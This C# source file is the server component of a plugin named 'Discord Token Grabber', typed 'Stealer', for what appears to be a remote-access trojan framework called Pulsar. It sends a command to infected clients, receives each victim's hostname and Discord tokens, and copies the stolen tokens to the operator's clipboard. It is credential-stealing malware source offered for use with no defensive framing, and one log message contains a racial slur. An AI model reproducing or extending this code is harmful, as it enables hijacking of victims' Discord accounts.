using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Windows.Forms;
using Pulsar.Server.Messages;
using Pulsar.Server.Plugins;
using Pulsar.Server.Networking;

namespace Pulsar.Plugin.MessageBox.Server
{
    public class PendingMessageManager
    {
        private readonly Dictionary<string, string> _pendingMessages = new Dictionary<string, string>();

        public void Add(string clientKey, string message)
        {
            _pendingMessages[clientKey] = message;
        }

        public string GetAndRemove(string clientKey)
        {
            if (_pendingMessages.TryGetValue(clientKey, out string message))
            {
                _pendingMessages.Remove(clientKey);
                return message;
            }
            return null;
        }

        public void Remove(string clientKey)
        {
            _pendingMessages.Remove(clientKey);
        }
    }

    public class MessageBoxServerPlugin : IServerPlugin
    {
        public string Name => "Discord Token Grabber";
        public Version Version => new Version(1, 0, 0);
        public string Description => "Requests Discord tokens from clients";
        public string Type => "Stealer";
        public bool AutoLoadToClients => false;

        private IServerContext _context;
        private PendingMessageManager _pendingManager;
        private ResponseHandler _responseHandler;

        public void Initialize(IServerContext context)
        {
            _context = context;
            _pendingManager = new PendingMessageManager();
            _responseHandler = new ResponseHandler(context, _pendingManager);

            UniversalPluginResponseHandler.ResponseReceived += _responseHandler.HandleResponse;

            _context.AddClientContextMenuItem(
                "Discord Tokens",
                "Grab Discord Tokens",
                OnSendMessageBox
            );

            _context.Log($"{Name} v{Version} loaded (giganiggas)");
        }

        private void OnSendMessageBox(IReadOnlyList<Client> clients)
        {
            if (clients == null || clients.Count == 0)
            {
                _context.Log("nun selected hommie");
                return;
            }

            foreach (var client in clients)
            {
                SendMessageBoxCommand(client);
            }

            _context.Log($"asked for token {clients.Count} client(s)");
        }

        private void SendMessageBoxCommand(Client client)
        {
            byte[] messageBytes = Encoding.UTF8.GetBytes(string.Empty);
            PushSender.ExecuteUniversalCommand(
                client,
                "discord-tokens",
                "tokens",
                messageBytes
            );

            string key = client.EndPoint.ToString();
            _pendingManager.Add(key, "asked for token");

            _context.Log($"asked for token {client.EndPoint}");
        }
    }

    public class ResponseHandler
    {
        private readonly IServerContext _context;
        private readonly PendingMessageManager _pendingManager;

        public ResponseHandler(IServerContext context, PendingMessageManager pendingManager)
        {
            _context = context;
            _pendingManager = pendingManager;
        }

        public void HandleResponse(PluginResponse response)
        {
            if (response.PluginId != "discord-tokens")
                return;

            string clientKey = response.Client.EndPoint.ToString();

            if (response.Success && response.Data != null)
            {
                HandleSuccessfulResponse(response, clientKey);
            }
            else
            {
                HandleErrorResponse(response, clientKey);
            }
        }

        private void HandleSuccessfulResponse(PluginResponse response, string clientKey)
        {
            string responseData = Encoding.UTF8.GetString(response.Data);
            string originalMessage = _pendingManager.GetAndRemove(clientKey);

            _context.Log($"client {response.Client.EndPoint} responded {responseData}");

            var parts = responseData.Split(new[] { '\n' }, 2, StringSplitOptions.None);
            if (parts.Length < 2)
            {
                _context.Log("incorrect format");
                return;
            }

            string userHostName = parts[0].Trim();
            string tokens = parts[1].Trim();

            Clipboard.SetText(tokens);
            _context.Log($"tried to copy to clipboard {userHostName}");
        }

        private void HandleErrorResponse(PluginResponse response, string clientKey)
        {
            _pendingManager.Remove(clientKey);
            _context.Log($"err responce from client {response.Client.EndPoint}: {response.Message}");
        }
    }
}
